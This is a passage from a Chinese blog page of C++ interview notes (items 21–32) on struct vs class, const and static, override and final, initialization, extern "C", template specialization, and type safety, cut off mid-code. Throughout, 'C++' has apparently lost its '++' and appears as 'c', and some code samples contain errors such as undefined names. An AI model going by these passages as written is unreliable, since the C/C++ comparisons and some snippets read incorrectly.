。（操作内存的确是一项非常危险的事情，一旦指针指向的位置发生错误，或者误删除了内存中某个地址单元存放的重要数据，后果是可想而知的）</li><li>Java在Web 应用上具有c 无可比拟的优势，具有丰富多样的框架</li><li>对于底层程序的编程以及控制方面的编程，c很灵活，因为有句柄的存在</li></ul><blockquote><p>《c和java的区别和联系》：<a href="https://www.cnblogs.com/tanrong/p/8503202.html">https://www.cnblogs.com/tanrong/p/8503202.html</a></p></blockquote><h4 id="22、c中struct和class的区别"><a href="#22、c中struct和class的区别" class="headerlink" title="22、c中struct和class的区别"></a>22、c中struct和class的区别</h4><p><strong>相同点</strong></p><ul><li>两者都拥有成员函数、公有和私有部分</li><li>任何可以使用class完成的工作，同样可以使用struct完成</li></ul><p><strong>不同点</strong></p><ul><li><p>两者中如果不对成员不指定公私有，struct默认是公有的，class则默认是私有的</p></li><li><p>class默认是private继承，而struct模式是public继承</p></li></ul><p><strong>引申</strong>：c和C的struct区别</p><ul><li><p>C语言中：struct是用户自定义数据类型（UDT）；c中struct是抽象数据类型（ADT），支持成员函数的定义，（c中的struct能继承，能实现多态）</p></li><li><p>C中struct是没有权限的设置的，且struct中只能是一些变量的集合体，可以封装数据却不可以隐藏数据，而且成员<strong>不可以是函数</strong></p></li><li><p>c中，struct增加了访问权限，且可以和类一样有成员函数，成员默认访问说明符为public（为了与C兼容）</p></li><li><p>struct作为类的一种特例是用来自定义数据结构的。一个结构标记声明后，在C中必须在结构标记前加上struct，才能做结构类型名（除：typedef struct class{};）;c中结构体标记（结构体名）可以直接作为结构体类型名使用，此外结构体struct在c中被当作类的一种特例</p></li></ul><blockquote><p>《struct结构在C和c中的区别》：<a href="https://blog.csdn.net/mm_hh/article/details/70456240">https://blog.csdn.net/mm_hh/article/details/70456240</a></p></blockquote><h4 id="23、define宏定义和const的区别"><a href="#23、define宏定义和const的区别" class="headerlink" title="23、define宏定义和const的区别"></a>23、define宏定义和const的区别</h4><p><strong>编译阶段</strong></p><ul><li>define是在编译的<strong>预处理</strong>阶段起作用，而const是在编译、运行的时候起作用</li></ul><p><strong>安全性</strong></p><ul><li>define只做替换，不做类型检查和计算，也不求解，容易产生错误，一般最好加上一个大括号包含住全部的内容，要不然很容易出错</li><li>const常量有数据类型，编译器可以对其进行类型安全检查</li></ul><p><strong>内存占用</strong></p><ul><li><p>define只是将宏名称进行替换，在内存中会产生多分相同的备份。const在程序运行中只有一份备份，且可以执行常量折叠，能将复杂的的表达式计算出结果放入常量表</p></li><li><p>宏替换发生在编译阶段之前，属于文本插入替换；const作用发生于编译过程中。</p></li><li><p>宏不检查类型；const会检查数据类型。</p></li><li><p>宏定义的数据没有分配内存空间，只是插入替换掉；const定义的变量只是值不能改变，但要分配内存空间。</p></li></ul><h4 id="24、c中const和static的作用"><a href="#24、c中const和static的作用" class="headerlink" title="24、c中const和static的作用"></a>24、c中const和static的作用</h4><p><strong>static</strong></p><ul><li>不考虑类的情况<ul><li>隐藏。所有不加static的全局变量和函数具有全局可见性，可以在其他文件中使用，加了之后只能在该文件所在的编译模块中使用</li><li>默认初始化为0，包括未初始化的全局静态变量与局部静态变量，都存在全局未初始化区</li><li>静态变量在函数内定义，始终存在，且只进行一次初始化，具有记忆性，其作用范围与局部变量相同，函数退出后仍然存在，但不能使用</li></ul></li><li>考虑类的情况<ul><li>static成员变量：只与类关联，不与类的对象关联。定义时要分配空间，不能在类声明中初始化，必须在类定义体外部初始化，初始化时不需要标示为static；可以被非static成员函数任意访问。</li><li>static成员函数：不具有this指针，无法访问类对象的非static成员变量和非static成员函数；<strong>不能被声明为const、虚函数和volatile</strong>；可以被非static成员函数任意访问</li></ul></li></ul><p><strong>const</strong></p><ul><li><p>不考虑类的情况</p><ul><li><p>const常量在定义时必须初始化，之后无法更改</p></li><li><p>const形参可以接收const和非const类型的实参，例如</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// i 可以是 int 型或者 const int 型</span><span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//...</span><span class="token punctuation">&#125;</span></code></pre></li></ul></li><li><p>考虑类的情况</p><ul><li>const成员变量：不能在类定义外部初始化，只能通过构造函数初始化列表进行初始化，并且必须有构造函数；不同类对其const数据成员的值可以不同，所以不能在类中声明时初始化</li><li>const成员函数：const对象不可以调用非const成员函数；非const对象都可以调用；不可以改变非mutable（用该关键字声明的变量可以在const成员函数中被修改）数据的值</li></ul></li></ul><h4 id="25、c的顶层const和底层const"><a href="#25、c的顶层const和底层const" class="headerlink" title="25、c的顶层const和底层const"></a>25、c的顶层const和底层const</h4><p><strong>概念区分</strong></p><ul><li><strong>顶层</strong>const：指的是const修饰的变量<strong>本身</strong>是一个常量，无法修改，指的是指针，就是 * 号的右边</li><li><strong>底层</strong>const：指的是const修饰的变量<strong>所指向的对象</strong>是一个常量，指的是所指变量，就是 * 号的左边</li></ul><p><strong>举个例子</strong></p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token operator">*</span> <span class="token keyword">const</span> b1 <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">;</span>        <span class="token comment">//顶层const，b1本身是一个常量</span><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">*</span> b2 <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">;</span>        <span class="token comment">//底层const，b2本身可变，所指的对象是常量</span><span class="token keyword">const</span> <span class="token keyword">int</span> b3 <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>    <span class="token comment">//顶层const，b3是常量不可变</span><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">*</span> <span class="token keyword">const</span> b4 <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">;</span>  <span class="token comment">//前一个const为底层，后一个为顶层，b4不可变</span><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> b5 <span class="token operator">=</span> a<span class="token punctuation">;</span>   <span class="token comment">//用于声明引用变量，都是底层const</span></code></pre><p><strong>区分作用</strong></p><ul><li>执行对象拷贝时有限制，常量的底层const不能赋值给非常量的底层const</li><li>使用命名的强制类型转换函数const_cast时，只能改变运算对象的底层const</li></ul><blockquote><p>《c 顶层const与底层const总结》：<a href="https://www.jianshu.com/p/fbbcf11100f6">https://www.jianshu.com/p/fbbcf11100f6</a></p><p>《c的顶层const和底层const浅析》：<a href="https://blog.csdn.net/qq_37059483/article/details/78811231">https://blog.csdn.net/qq_37059483/article/details/78811231</a></p></blockquote><pre class="language-none"><code class="language-none">const int a;int const a;const int *a;int *const a;</code></pre><ul><li><p>int const a和const int a均表示定义常量类型a。</p></li><li><p>const int <em>a，其中a为指向int型变量的指针，const在 </em> 左侧，表示a指向不可变常量。(看成const (*a)，对引用加const)</p></li><li><p>int *const a，依旧是指针类型，表示a为指向整型数据的常指针。(看成const(a)，对指针const)</p></li></ul><h4 id="26、类的对象存储空间？"><a href="#26、类的对象存储空间？" class="headerlink" title="26、类的对象存储空间？"></a>26、类的对象存储空间？</h4><ul><li><p>非静态成员的数据类型大小之和。</p></li><li><p>编译器加入的额外成员变量（如指向虚函数表的指针）。</p></li><li><p>为了边缘对齐优化加入的padding。</p><p>空类(无非静态数据成员)的对象的size为1, 当作为基类时, size为0. </p></li></ul><h4 id="27、final和override关键字"><a href="#27、final和override关键字" class="headerlink" title="27、final和override关键字"></a>27、final和override关键字</h4><p><strong>override</strong></p><p>当在父类中使用了虚函数时候，你可能需要在某个子类中对这个虚函数进行重写，以下方法都可以：</p><pre class="language-c" data-language="c"><code class="language-c">class A<span class="token punctuation">&#123;</span>    virtual <span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>class B <span class="token operator">:</span> public A<span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//OK</span>    virtual <span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// OK</span>    <span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> override<span class="token punctuation">;</span> <span class="token comment">//OK</span><span class="token punctuation">&#125;</span></code></pre><p>如果不使用override，当你手一抖，将<strong>foo()</strong>写成了<strong>f00()</strong>会怎么样呢？结果是编译器并不会报错，因为它并不知道你的目的是重写虚函数，而是把它当成了新的函数。如果这个虚函数很重要的话，那就会对整个程序不利。所以，override的作用就出来了，它指定了子类的这个虚函数是重写的父类的，如果你名字不小心打错了的话，编译器是不会编译通过的：</p><pre class="language-c" data-language="c"><code class="language-c">class A<span class="token punctuation">&#123;</span>    virtual <span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class B <span class="token operator">:</span> public A<span class="token punctuation">&#123;</span>    virtual <span class="token keyword">void</span> <span class="token function">f00</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//OK，这个函数是B新增的，不是继承的</span>    virtual <span class="token keyword">void</span> <span class="token function">f0o</span><span class="token punctuation">(</span><span class="token punctuation">)</span> override<span class="token punctuation">;</span> <span class="token comment">//Error, 加了override之后，这个函数一定是继承自A的，A找不到就报错</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p><strong>final</strong></p><p>当不希望某个类被继承，或不希望某个虚函数被重写，可以在类名和虚函数后添加final关键字，添加final关键字后被继承或重写，编译器会报错。例子如下：</p><pre class="language-c" data-language="c"><code class="language-c">class Base<span class="token punctuation">&#123;</span>    virtual <span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> class A <span class="token operator">:</span> public Base<span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> final<span class="token punctuation">;</span> <span class="token comment">// foo 被override并且是最后一个override，在其子类中不可以重写</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class B final <span class="token operator">:</span> A <span class="token comment">// 指明B是不可以被继承的</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> override<span class="token punctuation">;</span> <span class="token comment">// Error: 在A中已经被final了</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> class C <span class="token operator">:</span> B <span class="token comment">// Error: B is final</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><blockquote><p>《c:override和final》：<a href="https://www.cnblogs.com/whlook/p/6501918.html">https://www.cnblogs.com/whlook/p/6501918.html</a></p></blockquote><h4 id="28、拷贝初始化和直接初始化"><a href="#28、拷贝初始化和直接初始化" class="headerlink" title="28、拷贝初始化和直接初始化"></a>28、拷贝初始化和直接初始化</h4><ul><li>当用于类类型对象时，初始化的拷贝形式和直接形式有所不同：直接初始化直接调用与实参匹配的构造函数，拷贝初始化总是调用拷贝构造函数。拷贝初始化首先使用指定构造函数创建一个临时对象，然后用拷贝构造函数将那个临时对象拷贝到正在创建的对象。举例如下</li></ul><pre class="language-c" data-language="c"><code class="language-c">string <span class="token function">str1</span><span class="token punctuation">(</span><span class="token string">"I am a string"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//语句1 直接初始化</span>string <span class="token function">str2</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//语句2 直接初始化，str1是已经存在的对象，直接调用构造函数对str2进行初始化</span>string str3 <span class="token operator">=</span> <span class="token string">"I am a string"</span><span class="token punctuation">;</span><span class="token comment">//语句3 拷贝初始化，先为字符串”I am a string“创建临时对象，再把临时对象作为参数，使用拷贝构造函数构造str3</span>string str4 <span class="token operator">=</span> str1<span class="token punctuation">;</span><span class="token comment">//语句4 拷贝初始化，这里相当于隐式调用拷贝构造函数，而不是调用赋值运算符函数</span></code></pre><ul><li><strong>为了提高效率，允许编译器跳过创建临时对象这一步，</strong>直接调用构造函数构造要创建的对象，这样就完全等价于<strong>直接初始化了</strong>（语句1和语句3等价）。但是需要辨别两种情况。<ul><li>当拷贝构造函数为private时：语句3和语句4在编译时会报错</li><li>使用explicit修饰构造函数时：如果构造函数存在隐式转换，编译时会报错</li></ul></li></ul><blockquote><p>c的直接初始化与复制初始化的区别：<a href="https://blog.csdn.net/qq936836/article/details/83450218">https://blog.csdn.net/qq936836/article/details/83450218</a></p></blockquote><h4 id="29、初始化和赋值的区别"><a href="#29、初始化和赋值的区别" class="headerlink" title="29、初始化和赋值的区别"></a>29、初始化和赋值的区别</h4><ul><li>对于简单类型来说，初始化和赋值没什么区别</li><li>对于类和复杂数据类型来说，这两者的区别就大了，举例如下：</li></ul><pre class="language-c" data-language="c"><code class="language-c">class A<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    <span class="token keyword">int</span> num1<span class="token punctuation">;</span>    <span class="token keyword">int</span> num2<span class="token punctuation">;</span>public<span class="token operator">:</span>    <span class="token function">A</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">num1</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">num2</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">A</span><span class="token punctuation">(</span><span class="token keyword">const</span> A<span class="token operator">&amp;</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">//重载 = 号操作符函数</span>    A<span class="token operator">&amp;</span> operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> A<span class="token operator">&amp;</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        num1 <span class="token operator">=</span> a<span class="token punctuation">.</span>num1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        num2 <span class="token operator">=</span> a<span class="token punctuation">.</span>num2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    A <span class="token function">a</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    A a1 <span class="token operator">=</span> a<span class="token punctuation">;</span> <span class="token comment">//拷贝初始化操作，调用拷贝构造函数</span>    A b<span class="token punctuation">;</span>    b <span class="token operator">=</span> a<span class="token punctuation">;</span><span class="token comment">//赋值操作，对象a中，num1 = 1，num2 = 1；对象b中，num1 = 2，num2 = 2</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="30、extern”C”的用法"><a href="#30、extern”C”的用法" class="headerlink" title="30、extern”C”的用法"></a>30、extern”C”的用法</h4><p>为了能够<strong>正确的在c代码中调用C语言</strong>的代码：在程序中加上extern “C”后，相当于告诉编译器这部分代码是C语言写的，因此要按照C语言进行编译，而不是c；</p><p>哪些情况下使用extern “C”：</p><p>（1）c代码中调用C语言代码；</p><p>（2）在c中的头文件中使用；</p><p>（3）在多个人协同开发时，可能有人擅长C语言，而有人擅长c；</p><p>举个例子，c中调用C代码：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">__MY_HANDLE_H__</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__MY_HANDLE_H__</span></span><span class="token keyword">extern</span> <span class="token string">"C"</span><span class="token punctuation">&#123;</span>    <span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token class-name">result_t</span><span class="token punctuation">;</span>    <span class="token keyword">typedef</span> <span class="token keyword">void</span><span class="token operator">*</span> <span class="token class-name">my_handle_t</span><span class="token punctuation">;</span>        <span class="token class-name">my_handle_t</span> <span class="token function">create_handle</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">result_t</span> <span class="token function">operate_on_handle</span><span class="token punctuation">(</span><span class="token class-name">my_handle_t</span> handle<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">close_handle</span><span class="token punctuation">(</span><span class="token class-name">my_handle_t</span> handle<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ul><li>参考的blog中有一篇google code上的文章，专门写extern “C”的，有兴趣的读者不妨去看看</li></ul><blockquote><p>《extern “C”的功能和用法研究》：<a href="https://blog.csdn.net/sss_369/article/details/84060561">https://blog.csdn.net/sss_369/article/details/84060561</a></p></blockquote><p>综上，总结出使用方法<strong>，在C语言的头文件中，对其外部函数只能指定为extern类型，C语言中不支持extern “C”声明，在.c文件中包含了extern “C”时会出现编译语法错误。</strong>所以使用extern “C”全部都放在于cpp程序相关文件或其头文件中。</p><p>总结出如下形式：</p><p>（1）c调用C函数：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//xx.h</span><span class="token keyword">extern</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token comment">//xx.c</span><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//xx.cpp</span><span class="token keyword">extern</span> <span class="token string">"C"</span> <span class="token punctuation">&#123;</span>    <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"xx.h"</span></span><span class="token punctuation">&#125;</span></code></pre><p>（2）C调用c函数</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//xx.h</span><span class="token keyword">extern</span> <span class="token string">"C"</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//xx.cpp</span><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//xx.c</span><span class="token keyword">extern</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="31、模板函数和模板类的特例化"><a href="#31、模板函数和模板类的特例化" class="headerlink" title="31、模板函数和模板类的特例化"></a>31、模板函数和模板类的特例化</h4><p><strong>引入原因</strong></p><p>编写单一的模板，它能适应多种类型的需求，使每种类型都具有相同的功能，但对于某种特定类型，如果要实现其特有的功能，单一模板就无法做到，这时就需要模板特例化</p><p><strong>定义</strong></p><p>对单一模板提供的一个特殊实例，它将一个或多个模板参数绑定到特定的类型或值上</p><p><strong>（1）模板函数特例化</strong></p><p>必须为原函数模板的每个模板参数都提供实参，且使用关键字template后跟一个空尖括号对&lt;&gt;，表明将原模板的所有模板参数提供实参，举例如下：</p><pre class="language-c" data-language="c"><code class="language-c">template<span class="token operator">&lt;</span>typename T<span class="token operator">></span> <span class="token comment">//模板函数</span><span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token keyword">const</span> T <span class="token operator">&amp;</span>v1<span class="token punctuation">,</span><span class="token keyword">const</span> T <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>v1 <span class="token operator">></span> v2<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>v2 <span class="token operator">></span> v1<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//模板特例化,满足针对字符串特定的比较，要提供所有实参，这里只有一个T</span>template<span class="token operator">&lt;</span><span class="token operator">></span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token keyword">const</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token keyword">const</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>本质</strong></p><p>特例化的本质是实例化一个模板，而非重载它。特例化不影响参数匹配。参数匹配都以最佳匹配为原则。例如，此处如果是compare(3,5)，则调用普通的模板，若为compare(“hi”,”haha”)则调用<strong>特例化版本</strong>（因为这个cosnt char*相对于T，更匹配实参类型），注意二者函数体的语句不一样了，实现不同功能。</p><p><strong>注意</strong></p><p>模板及其特例化版本应该声明在同一个头文件中，且所有同名模板的声明应该放在前面，后面放特例化版本。</p><p><strong>（2）类模板特例化</strong></p><p>原理类似函数模板，<strong>不过在类中，我们可以对模板进行特例化，也可以对类进行部分特例化。</strong>对类进行特例化时，仍然用template&lt;&gt;表示是一个特例化版本，例如：</p><pre class="language-c" data-language="c"><code class="language-c">template<span class="token operator">&lt;</span><span class="token operator">></span>class hash<span class="token operator">&lt;</span>sales_data<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token class-name">size_t</span> <span class="token function">operator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>sales_data<span class="token operator">&amp;</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//里面所有T都换成特例化类型版本sales_data</span><span class="token comment">//按照最佳匹配原则，若T != sales_data，就用普通类模板，否则，就使用含有特定功能的特例化版本。</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p><strong>类模板的部分特例化</strong></p><p>不必为所有模板参数提供实参，可以<strong>指定一部分而非所有模板参数</strong>，一个类模板的部分特例化本身仍是一个模板，使用它时还必须为其特例化版本中未指定的模板参数提供实参(特例化时类名一定要和原来的模板相同，只是参数类型不同，按最佳匹配原则，哪个最匹配，就用相应的模板)</p><p><strong>特例化类中的部分成员</strong></p><p><strong>可以特例化类中的部分成员函数而不是整个类</strong>，举个例子：</p><pre class="language-c" data-language="c"><code class="language-c">template<span class="token operator">&lt;</span>typename T<span class="token operator">></span>class Foo<span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">Bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">Barst</span><span class="token punctuation">(</span>T a<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>template<span class="token operator">&lt;</span><span class="token operator">></span><span class="token keyword">void</span> Foo<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">Bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//进行int类型的特例化处理</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"我是int型特例化"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>Foo<span class="token operator">&lt;</span>string<span class="token operator">></span> fs<span class="token punctuation">;</span>Foo<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> fi<span class="token punctuation">;</span><span class="token comment">//使用特例化</span>fs<span class="token punctuation">.</span><span class="token function">Bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//使用的是普通模板，即Foo&lt;string>::Bar()</span>fi<span class="token punctuation">.</span><span class="token function">Bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//特例化版本，执行Foo&lt;int>::Bar()</span><span class="token comment">//Foo&lt;string>::Bar()和Foo&lt;int>::Bar()功能不同</span></code></pre><blockquote><p>《类和函数模板特例化》：<a href="https://blog.csdn.net/wang664626482/article/details/52372789">https://blog.csdn.net/wang664626482/article/details/52372789</a></p></blockquote><h4 id="32、C和c的类型安全"><a href="#32、C和c的类型安全" class="headerlink" title="32、C和c的类型安全"></a>32、C和c的类型安全</h4><p> <strong>什么是类型安全？</strong></p><p>类型安全很大程度上可以等价于内存安全，类型安全的代码不会试图访问自己没被授权的内存区域。“类型安全”常被用来形容编程语言，其根据在于该门编程语言是否提供保障类型安全的机制；有的时候也用“类型安全”形容某个程序，判别的标准在于该程序是否隐含类型错误。类型安全的编程语言与类型安全的程序之间，没有必然联系。好的程序员可以使用类型不那么安全的语言写出类型相当安全的程序，相反的，差一点儿的程序员可能使用类型相当安全的语言写出类型不太安全的程序。绝对类型安全的编程语言暂时还没有。</p><p><strong>（1）C的类型安全</strong></p><p>C只在局部上下文中表现出类型安全，比如试图从一种结构体的指针转换成另一种结构体的指针时，编译器将会报告错误，除非使用显式类型转换。然而，C中相当多的操作是不安全的。以下是两个十分常见的例子：</p><ul><li>printf格式输出</li></ul><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1563707616406.png" alt=""></p><p>上述代码中，使用%d控制整型数字的输出，没有问题，但是改成%f时，明显输出错误，再改成%s时，运行直接报segmentation fault错误</p><ul><li>malloc函数的返回值</li></ul><p>malloc是C中进行内存分配的函数，它的返回类型是void*即空类型指针，常常有这样的用法char* pStr=(char*)malloc(100*sizeof(char))，这里明显做了显式的类型转换。类型匹配尚且没有问题，但是一旦出现int* pInt=(int<em>)malloc(100\</em>sizeof(char))就很可能带来一些问题，而这样的转换C并不会提示错误。</p><p><strong>（2）c的类型安全</strong></p><p>如果c使用得当，它将远比C更有类型安全性。相比于C语言，c提供了一些新的机制保障类型安全：</p><ul><li><p>操作符new返回的指针类型严格与对象匹配，而不是void*</p></li><li><p>C中很多以void*为参数的函数可以改写为c模板函数，而模板是支持类型检查的；</p></li><li><p>引入const关键字代替#define constants，它是有类型、有作用域的，而#define constants只是简单的文本替换</p></li><li><p>一些#define宏可被改写为inline函数，结合函数的重载，可在类型安全的前提下支持多种类型，当然改写为模板也能保证类型安全</p></li><li><p>c提供了<strong>dynamic_cast</strong>关键字，使得转换过程更加安全，因为dynamic_cast比static_cast涉及更多具体的类型检查。</p><p>例1：使用void*进行类型转换</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1563708254043.png" alt=""></p><p>​    例2：不同类型指针之间转换</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span> class Parent<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class Child1 <span class="token operator">:</span> public Parent<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token function">Child1</span><span class="token punctuation">(</span><span class="token keyword">int</span> e<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">i</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class Child2 <span class="token operator">:</span> public Parent<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token keyword">double</span> d<span class="token punctuation">;</span><span class="token function">Child2</span><span class="token punctuation">(</span><span class="token keyword">double</span> e<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">d</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Child1 <span class="token function">c1</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Child2 <span class="token function">c2</span><span class="token punctuation">(</span><span class="token 